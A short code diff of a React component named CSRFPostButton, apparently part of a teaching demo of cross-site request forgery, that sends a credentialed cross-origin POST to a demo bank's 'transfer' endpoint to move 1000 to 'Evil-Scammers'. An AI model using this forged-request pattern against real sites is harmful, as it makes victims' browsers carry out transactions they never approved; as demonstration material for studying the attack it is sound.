@@ -16,11 +16,12 @@ export default function CSRFPostButton(props: Props) {
   const [hasClicked, setHasClicked] = useState(false);
 
   const onClick = useCallback(() => {
+    const body = new URLSearchParams('amount=1000&description=Gotcha!&to=Evil-Scammers');
     fetch('https://dsb.victorzhou.com/transfer', {
+      body,
       credentials: 'include', // include cookies, despite being a cross-origin request
       method: 'post',
       mode: 'no-cors',
-      body: new URLSearchParams('amount=1000&description=Gotcha!&to=Evil-Scammers'),
     })
       .then(() => {
         setHasClicked(true);
